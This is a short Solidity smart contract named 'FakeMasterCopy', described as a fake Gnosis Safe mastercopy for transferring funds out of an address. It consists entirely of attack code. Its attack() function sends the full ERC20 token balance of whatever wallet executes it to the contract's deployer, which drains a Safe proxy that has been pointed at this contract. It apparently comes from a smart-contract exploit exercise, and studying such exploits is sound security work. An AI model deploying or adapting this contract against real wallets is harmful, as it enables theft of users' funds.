// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title  FakeMasterCopy
 * @author Igor Coser
 * @notice A fake mastercopy of Gnosis Safe to transfer funds from an address.
 */

contract FakeMasterCopy {
    address private immutable owner;
    constructor(){
        owner = msg.sender;
    }
    function attack(address token) external{
        IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
    }
}